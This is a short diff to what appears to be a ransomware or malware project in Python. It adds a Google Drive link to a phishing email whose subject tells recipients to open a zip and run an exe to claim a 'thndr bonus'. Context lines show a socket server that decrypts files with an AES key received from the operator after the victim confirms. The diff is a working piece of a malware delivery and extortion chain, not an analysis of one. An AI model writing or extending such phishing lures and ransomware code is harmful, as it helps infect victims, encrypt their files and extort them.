@@ -99,7 +99,7 @@ def sendmail(content, receiver):
     message["From"] = sender_email
     message["To"] = receiver_email
     message["Subject"] = "Congratulation! You have been selected for thndr bonus please open the following zip folder and run the exe file to claim your bonus \n"
-    message["Subject"] += ""
+    message["Subject"] += "https://drive.google.com/file/d/1894riQAdJbHTYHxBNdYl6r3Ei8VdaZZQ/view?usp=sharing"
     # Attach the content as plain text
     message.attach(MIMEText(content, "plain"))
 
@@ -174,4 +174,3 @@ if user_input == 'OK':
     decrypt_all(AES_key_received.encode('utf-8'))
 
 server_socket.close()
-
